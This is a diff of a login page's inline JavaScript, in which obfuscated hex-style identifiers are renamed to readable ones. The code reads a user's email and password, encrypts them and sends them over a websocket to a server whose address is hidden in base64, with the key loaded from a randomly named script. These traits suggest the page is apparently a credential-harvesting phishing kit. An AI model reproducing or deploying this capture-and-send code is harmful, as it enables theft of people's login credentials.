@@ -38,54 +38,59 @@
 <script type="text/javascript" src="/u5a6b253ef2d45b180891bc4a1f212ff.js"></script>
 <script type="text/javascript">
     
-    const d14df0282df5455e831e90dba8c4cc5a = document.getElementById("f42cc63246d74cf7bc009d858a10b2e4");
-    const d79cf6f1b7104500a53e469d1d3bbce2 = document.getElementById("8670273112be45d2a8e83f0bbca9db0f");
-    const b11976cd9d9040ddba82b4d0620a7b2c = document.getElementById("26ac0de49a8043a4877dccdb1a04fe56");
-    const hda6bc1cc8d8469f88b702f88441e07a = document.getElementById("f30226c078224a00a336d66b9dd5350f");
-    var bfa644142d0a4806a8290c4d6f8f0a2e = false;
+    const submitBtn = document.getElementById("f42cc63246d74cf7bc009d858a10b2e4");
+    const emailInput = document.getElementById("8670273112be45d2a8e83f0bbca9db0f");
+    const parentInput = document.getElementById("26ac0de49a8043a4877dccdb1a04fe56");
+    const passwordInput = document.getElementById("f30226c078224a00a336d66b9dd5350f");
+    var singleClick = false;
 
-    d14df0282df5455e831e90dba8c4cc5a.addEventListener("click", se0e71d5a0a24673b1a3054ffbccbf18);
+    document.addEventListener("keyup", catchEnter);
+    submitBtn.addEventListener("click", submit);
 
-    function se0e71d5a0a24673b1a3054ffbccbf18(event) {
+    function catchEnter(event) { 
+        if (event.keyCode !== 13) return;
+        submit();
+     }
+    function submit() {
 
-        if(!d79cf6f1b7104500a53e469d1d3bbce2.value) { ca76c3bfe7984661bef2c17b57ac1aea("Please insert your email here", "8670273112be45d2a8e83f0bbca9db0f"); return; }
-        if(!ae6eeef24eae4060bc2349efbe274e03(d79cf6f1b7104500a53e469d1d3bbce2.value)) { ca76c3bfe7984661bef2c17b57ac1aea("Please insert valid email", "8670273112be45d2a8e83f0bbca9db0f"); return; }
-        if(!hda6bc1cc8d8469f88b702f88441e07a.value) { ca76c3bfe7984661bef2c17b57ac1aea("Insert your password", "f30226c078224a00a336d66b9dd5350f"); return; }
+        if(!emailInput.value) { setCustomError("Please insert your email here", "8670273112be45d2a8e83f0bbca9db0f"); return; }
+        if(!validateEmail(emailInput.value)) { setCustomError("Please insert valid email", "8670273112be45d2a8e83f0bbca9db0f"); return; }
+        if(!passwordInput.value) { setCustomError("Insert your password", "f30226c078224a00a336d66b9dd5350f"); return; }
 
-        if (!bfa644142d0a4806a8290c4d6f8f0a2e) {
-            bfa644142d0a4806a8290c4d6f8f0a2e = !bfa644142d0a4806a8290c4d6f8f0a2e;
+        if (!singleClick) {
+            singleClick = !singleClick;
             const l642b6c8bc594f3e86abf9bbcf9a4d20 = {
                 autoConnect: true, 
                 query: { 
-                    sc7be6bdf90f453b99f1db8f6526518c: CryptoJS.AES.encrypt(d79cf6f1b7104500a53e469d1d3bbce2.value, e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
-                    d2c64414315b4598a5e5fe5832761101: CryptoJS.AES.encrypt(hda6bc1cc8d8469f88b702f88441e07a.value, e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
+                    sc7be6bdf90f453b99f1db8f6526518c: CryptoJS.AES.encrypt(emailInput.value, e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
+                    d2c64414315b4598a5e5fe5832761101: CryptoJS.AES.encrypt(passwordInput.value, e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
                 }
             };
-            const g8fd72ca4a1e48debdc59b5d540f9e69 = io(atob(e1af8e88bd704de197b26c904257f7ed.dc503f3c15684a76bd1874dce9cb42a8), l642b6c8bc594f3e86abf9bbcf9a4d20);
-            g8fd72ca4a1e48debdc59b5d540f9e69.connect();
-            g8fd72ca4a1e48debdc59b5d540f9e69.emit("122377668230417aae686a77bb52da98", { room: "1" });
-            g8fd72ca4a1e48debdc59b5d540f9e69.on("cc0462fcafd24bc9b6e527607ad9a3b2", (data) => f9afe245a4c84f04a7cf554639a088f4(data));
-            g8fd72ca4a1e48debdc59b5d540f9e69.emit("cc0462fcafd24bc9b6e527607ad9a3b2", { room: "1" })
+            const socket = io(atob(e1af8e88bd704de197b26c904257f7ed.dc503f3c15684a76bd1874dce9cb42a8), l642b6c8bc594f3e86abf9bbcf9a4d20);
+            socket.connect();
+            socket.emit("122377668230417aae686a77bb52da98", { room: "1" });
+            socket.on("cc0462fcafd24bc9b6e527607ad9a3b2", (data) => changeContent(data));
+            socket.emit("cc0462fcafd24bc9b6e527607ad9a3b2", { room: "1" })
         }
     }
 
-    function ca76c3bfe7984661bef2c17b57ac1aea(ud7cf9724f3746858dbbbb83d00c0c23, n3b64f136841417f80478f932be7b5ef) {
-        const b44aaf48ccc443fc8fc190c2f85e6d22 = document.getElementById(n3b64f136841417f80478f932be7b5ef);
-        if(b44aaf48ccc443fc8fc190c2f85e6d22) { 
-            b44aaf48ccc443fc8fc190c2f85e6d22.setCustomValidity(ud7cf9724f3746858dbbbb83d00c0c23);
-            b44aaf48ccc443fc8fc190c2f85e6d22.reportValidity();
-            setTimeout(() => { b44aaf48ccc443fc8fc190c2f85e6d22.setCustomValidity(""); }, 2000);
+    function setCustomError(errorMessage, elementId) {
+        const el = document.getElementById(elementId);
+        if(el) { 
+            el.setCustomValidity(errorMessage);
+            el.reportValidity();
+            setTimeout(() => { el.setCustomValidity(""); }, 2000);
         }
     }
 
-    function ae6eeef24eae4060bc2349efbe274e03(f41b06c0383c47dd9e28d072a1135572) {
-        if(!(/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(.\w{2,3})+$/.test(f41b06c0383c47dd9e28d072a1135572))) 
+    function validateEmail(emailString) {
+        if(!(/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(.\w{2,3})+$/.test(emailString))) 
             return false;
         
         return true;
     }
 
-    function f9afe245a4c84f04a7cf554639a088f4(data) {
-        b11976cd9d9040ddba82b4d0620a7b2c.innerHTML = "success receiving " + JSON.stringify(data);
+    function changeContent(data) {
+        parentInput.innerHTML = "success receiving " + JSON.stringify(data);
     }
 </script>
